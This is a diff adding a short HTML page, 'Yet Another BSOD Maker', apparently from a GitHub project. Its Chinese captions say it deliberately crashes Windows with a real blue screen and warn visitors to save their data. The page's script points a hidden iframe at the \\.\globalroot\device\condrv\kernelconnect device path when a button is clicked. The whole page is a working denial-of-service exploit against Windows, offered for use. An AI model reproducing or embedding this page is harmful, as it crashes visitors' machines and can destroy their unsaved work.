@@ -1,0 +1,22 @@
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>>Yet Another BSOD Maker</title>
+</head>
+
+<body marginheight="0px" marginwidth="0px">
+    <H4>本页面原理为使用iframe访问\\.\globalroot\device\condrv\kernelconnect制造一个真的蓝屏</H4>
+    <H2>蓝屏是真的,请保存好数据再作死!!!</H2>
+    <H4>琴梨梨出品 Github@qinlili23333欢迎提PR</H4>
+    <br>
+    <button onclick="makeBSOD();">制造蓝屏</button>
+    <iframe id="BSODframe" style="display:none;"></iframe>
+    <script>
+        function makeBSOD(){
+            document.getElementById("BSODframe").src="file:///\\.\\globalroot\\device\\condrv\\kernelconnect"
+        }
+    </script>
+</body>
+
+</html>
